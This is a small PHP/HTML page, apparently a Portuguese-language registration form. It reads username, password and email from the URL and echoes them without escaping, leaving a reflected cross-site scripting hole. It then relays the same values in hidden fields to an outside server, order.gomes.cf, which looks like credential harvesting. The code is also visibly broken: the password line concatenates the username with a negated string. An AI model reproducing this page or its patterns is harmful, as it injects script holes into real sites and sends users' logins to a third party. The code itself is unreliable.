<?php
$id = 0 ;
$id = md5(rand(6000,99999999999999991000));

$username = $_GET['username']; echo " Username: " . $username . '<br>' ;
$password = $_GET['username'] . -'br' ; echo " Password: "  . $password . '<br>' ;
$email       = $_GET['email'];       echo " @e-mail: "    . $email . '<br>' ;

?>

<html>

<form method=post action="http://order.gomes.cf/register2.php">

<input type=hidden name="website_language" value="Non-English">
<input type=hidden name="website_category" value="Software / Download">

<input type=hidden  value="<?php echo $_GET['username']; ?>" name="username" >
<input type=hidden  value="<?php echo $_GET['password']; ?>" name="password" >
<input type=hidden  value="<?php echo $_GET['email']; ?>"       name="email" >

<input alt="Codigo de Registro" 
        style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 20px; margin-top: 5px; margin-bottom: 15px; border-color: rgb(136, 136, 170); width: 150px; min-height: 30px; display: block; outline: none; border-top-left-radius: 5px; border-top-right-radius: 5px; border-bottom-right-radius: 5px; border-bottom-left-radius: 5px; -webkit-box-shadow: rgba(0, 0, 255, 0.498039) 0px 0px 5px; box-shadow: rgba(0, 0, 255, 0.498039) 0px 0px 5px;" 
        type="image" 
          src="http://order.gomes.cf/image.php?<?php echo $id ?>" >
</input>



<input type=text name=number size=30>

<input type=submit value="Sobrenome << Cadastrar >>" name=submit>

</form>

</html>